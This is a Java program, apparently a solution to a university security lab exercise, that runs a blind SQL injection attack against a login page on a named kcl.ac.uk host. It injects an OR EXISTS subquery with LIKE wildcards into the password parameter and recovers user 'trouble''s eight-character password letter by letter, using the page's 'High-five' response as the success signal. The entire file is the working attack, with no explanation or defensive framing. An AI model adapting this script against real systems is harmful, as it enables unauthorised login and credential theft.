import java.net.*;
import java.io.*;

public class SQLInject {

  private static boolean checkPassword(String password) throws MalformedURLException,IOException {
    URL oracle = new URL("http://st223.dcs.kcl.ac.uk:8080/osc/trouble.php?username=xxx&password=%27%20OR%20EXISTS(SELECT%20*%20WHERE%20username=%27trouble%27%20AND%20password%20LIKE%20%27" + password + "%27)%20AND%20%27%27=%27");
    URLConnection yc = oracle.openConnection();
    BufferedReader in = new BufferedReader(new InputStreamReader(
                                yc.getInputStream()));
    String inputLine;
    while ((inputLine = in.readLine()) != null)
        if(inputLine.indexOf("High-five") != -1)
          return true;
    in.close();
    return false;
  }

  public static void main(String args[]) throws MalformedURLException,IOException {

    String password = "________";
    int index=0;
    for(char c='a'; c<='z'; ++c) {
      password = password.substring(0,index) + c + password.substring(index+1,8);
      if(checkPassword(password))
        ++index;
      if(index >= 8)
        break;
      else if (c=='z')
        c='a'-1;
    }
    System.out.println(password);
  }
}
